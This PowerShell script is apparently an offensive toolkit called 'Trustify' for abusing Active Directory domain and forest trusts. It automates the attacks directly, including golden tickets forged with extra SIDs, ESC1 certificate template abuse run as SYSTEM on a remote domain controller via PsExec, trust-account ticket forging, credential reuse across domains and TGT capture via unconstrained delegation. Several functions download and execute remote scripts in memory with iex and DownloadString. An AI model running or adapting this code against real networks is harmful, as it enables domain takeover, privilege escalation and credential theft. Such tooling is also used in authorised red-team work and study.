### Import necessary modules
Import-Module ActiveDirectory
# Import Rubeus powershell wrapper in memory
$RubeusImport = iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/y00ga-sec/Invoke-Hagrid.ps1/main/Invoke-Hagrid.ps1')

# Function to display the banner
function Show-Banner {
    $banner = @"

████████╗██████╗ ██╗   ██╗███████╗████████╗██╗███████╗██╗   ██╗
╚══██╔══╝██╔══██╗██║   ██║██╔════╝╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
   ██║   ██████╔╝██║   ██║███████╗   ██║   ██║█████╗   ╚████╔╝ 
   ██║   ██╔══██╗██║   ██║╚════██║   ██║   ██║██╔══╝    ╚██╔╝  
   ██║   ██║  ██║╚██████╔╝███████║   ██║   ██║██║        ██║   
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
                                                        
"@
    Write-Host $banner
}

### DONE
# Function to get trust details
function Get-TrustifyDetails {
    Show-Banner
    $trusts = Get-ADTrust -Filter * -Server (Get-ADDomain).DNSRoot
    $trustsDetails = @()
    
    foreach ($trust in $trusts) {
        $trustDetails = [PSCustomObject]@{
            TrustPartner            = $trust.Name
            TrustDirection          = $trust.Direction
            TrustSource             = $trust.Source
            TrustType               = $trust.TrustType
            TrustAttributes         = $trust.TrustAttributes
            IsIntraForest           = $trust.IntraForest
            IsTreeParent            = $trust.IsTreeParent
            IsTreeRoot              = $trust.IsTreeRoot
      SelectiveAuthenticationStatus = $trust.SelectiveAuthentication
            SIDFilteringForest      = $trust.SIDFilteringForestAware
            SIDFilteringQuarantined = $trust.SIDFilteringQuarantined
        }
        $trustsDetails += $trustDetails
    }
    
    return $trustsDetails
}

function Compare-SAMAccountNames {
    param (
        [Parameter(Mandatory=$true)]
        [string]$TargetDomain
    )
    
    Show-Banner
    # Hard-coded list of usernames to exclude
    $ExcludedUsernames = @('Administrator', 'Administrateur', 'Guest', 'Invité', 'krbtgt')

    # Get the current domain
    $currentDomain = Get-ADDomain | select -ExpandProperty DNSRoot

    # Get target domain controller
    $TargetDomainController = Get-ADDomainController -DomainName $TargetDomain -Discover | select -ExpandProperty HostName    

    # Get users in the current domain
    $currentDomainUsers = Get-ADUser -Filter * -Property sAMAccountName | Select-Object -ExpandProperty sAMAccountName

    # Filter out excluded usernames from current domain users
    $filteredCurrentDomainUsers = $currentDomainUsers | Where-Object { $ExcludedUsernames -notcontains $_ }

    # Get users in the target domain
    $TargetDomainUsers = Get-ADUser -Server $TargetDomainController -Filter * | Select-Object -ExpandProperty sAMAccountName

    # Filter out excluded usernames from target domain users
    $filteredTargetDomainUsers = $TargetDomainUsers | Where-Object { $ExcludedUsernames -notcontains $_ }

    # Find matching sAMAccountNames
    $matchingSAMAccountNames = $filteredCurrentDomainUsers | ForEach-Object {
        if ($filteredTargetDomainUsers -contains $_) {
            $_
        }
    }

    if ($matchingSAMAccountNames) {
        Write-Output "Matching sAMAccountNames found:"
        $matchingSAMAccountNames | ForEach-Object { Write-Output $_ }
        Write-Host -ForegroundColor Yellow -BackgroundColor Black "If you compromised any of those accounts, consider trying their passwords or NT hashes on their corresponding accounts in the target domain"
    } else {
        Write-Output "No matching sAMAccountNames found."
    }
}


## DONE
# Function to abuse ADCS and create a new ESC1 certificate template
function Abuse-ADCS {
    param (
        [Parameter(Mandatory=$true)]
        [string]$remoteComputer,
        [string]$templateName,
        [string]$psexecPath
    )
    
    Show-Banner
    $username = whoami 
    # Ensure PSexec path is valid
    if (-not (Test-Path -Path $psexecPath)) {
        throw "PsExec not found at specified path: $psexecPath"
    }

    # URL of the script to download
    $scriptUrl = "https://raw.githubusercontent.com/y00ga-sec/PKI-Escalate/main/PKI-Escalate.ps1"

    # Download the script content
    try {
        $scriptContent = Invoke-RestMethod -Uri $scriptUrl
    } catch {
        throw "Failed to download script from $scriptUrl"
    }

    # Create the PowerShell script content to be executed on the remote DC
    $remoteCommand = @"
$scriptContent
Invoke-Escalation -Username $username -TemplateName $templateName
"@

    # Create a temporary file with .ps1 extension
    $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + ".ps1")
    Set-Content -Path $tempFile -Value $remoteCommand -ErrorAction SilentlyContinue

    # Use PSexec to execute temp file script as SYSTEM on the remote DC
    & "$psexecPath" -s \\$remoteComputer powershell.exe -ExecutionPolicy Bypass -File $tempFile -ErrorAction SilentlyContinue

    # Clean up the temporary file
    Remove-Item -Path $tempFile -Force 
}


### DONE
##Function to exploit Extra-SID attack
function Add-ExtraSID {
    
    param (
        [Parameter(Mandatory=$true)]
        [string]$Username,
        [string]$KRBtgtRC4,
        [string]$TargetDomain,
        [string]$TargetDomainHighPrivGroup
    )
    
    Show-Banner
    #Check if attack is possible
    Write-Host -ForegroundColor Red -BackgroundColor Black "Before running this attack, running Get-ADTrustDetails is advised to check if SIDFiltering is enabled"    
    #Minimal User input required info for SID exploitation
    $CurrentDomain = Get-ADDomain | select -ExpandProperty DNSRoot
    # Retrieve other required information about current and target domain from user inputs
    $CurrentDomainSID = Get-ADDomain | select -ExpandProperty DomainSID | select -ExpandProperty Value
    $TargetDomainDC = Get-ADDomainController -DomainName $TargetDomain -Discover | select -ExpandProperty HostName
    $TargetDomainHighPrivGroupSID = Get-ADGroup -Identity $TargetDomainHighPrivGroup -Server $TargetDomainDC | select -ExpandProperty SID | select -ExpandProperty Value
    #Proceed to exploitation
    $RubeusImport
    Invoke-Hagrid -Command "golden /rc4:$KRBtgtRC4 /domain:$CurrentDomain /sid:$CurrentDomainSID /sids:$TargetDomainHighPrivGroupSID /user:$Username /ptt"
}


### DONE
##Function to check potential foreign group memberships, foreign ACLs and Shadow Principals
function Check-ForeignACL {

param (
    [Parameter(Mandatory=$true)]
    [string]$TargetDomain
)
    Show-Banner
    #Import Powerview
    $ErrorActionPreference = "SilentlyContinue"
    iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')) -ErrorAction SilentlyContinue
    # Get TargetDomain SID
    $DomainSid = Get-DomainSid $TargetDomain
    Write-Host -ForegroundColor Yellow -BackgroundColor Black "Target Domain is : $TargetDomain"
    Write-Host -ForegroundColor Yellow -BackgroundColor Black "SID : $DomainSid"
    Write-Host -ForegroundColor Yellow -BackgroundColor Black "Enumerating potential foreign group memberships/ACLs and Shadow Principals, this might take a lot of time on larger domains..."
    # Search for potential Shadow Principal
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
    #Use the Get-DomainObjectACL function to retrieve any potential ACL in the current domain over an object from a designated foreign domain
    Get-DomainObjectAcl -Domain $TargetDomain -ResolveGUIDs -Identity * -ErrorAction SilentlyContinue | ? { 
	    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and `
	    ($_.AceType -match 'AccessAllowed') -and `
	    ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and `
	    ($_.SecurityIdentifier -notmatch $DomainSid)
    }
}

# ALMOST DONE
##Function to exploit Trust account attack
function Forge-TrustAccountTicket {

 param (
    [Parameter(Mandatory=$true)]
    [string]$trustAccountName,
    [string]$TargetDomain,
    [string]$GimmeTrustKey
)
    Show-Banner
    $CurrentDomain = Get-ADDomain | select -ExpandProperty DNSRoot
    $RubeusImport
    Invoke-Hagrid -Command "asktgt /user:$trustAccountName /domain:$TargetDomain /rc4:$GimmeTrustKey /ptt"

}

### DONE
## Function to exploit Trust Unconstrained Delegation between the current running system and another Domain DC (intra and cross forest)
function Exploit-UnconstrainedDelegation {
    
    param (
        [Parameter(Mandatory=$true)]
        [string]$TargetDCHostname
    )
    
    Show-Banner
    # Create a hashtable to store computers configured for unconstrained delegation
    $computers = @{}

    # Retrieve all computer accounts with TrustedForDelegation property set to True
    Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Property DNSHostName | ForEach-Object {
        $computers[$_.DNSHostName] = $_
    }

    # Construct the fully qualified domain name (FQDN) of the current host
    $currentHost = $env:COMPUTERNAME + "." + (Get-DnsClientGlobalSetting).SuffixSearchList[0]

    # Check if the current host is in the hashtable and return the result
    if ($computers.ContainsKey($currentHost)) {
        Write-Host -ForegroundColor Yellow -BackgroundColor Black "Current host is configured for Unconstrained Delegation"
        Write-Host -ForegroundColor Yellow -BackgroundColor Black "Listening for target DC's TGT, please coerce an authentication..."

        # Define future script block as a string
        $scriptBlock = @"
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/y00ga-sec/Invoke-Hagrid.ps1/main/Invoke-Hagrid.ps1')
Invoke-Hagrid -Command 'monitor /interval:5 /nowrap /targetuser:$TargetDCHostname'
"@

        # Start a new PowerShell session with the script block
        Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptBlock
    } else {
        Write-Host -ForegroundColor Red -BackgroundColor Black "Current host is NOT configured for Unconstrained Delegation"
    }
}
## LOGIC : Check if current host is configured for Unconstrained Delegation, declare invoke-hagrid, start a new powershell session, import invoke-hagrid, and start a TGT monitor without time limit to let user time for coercing an auth for the specified target DC 
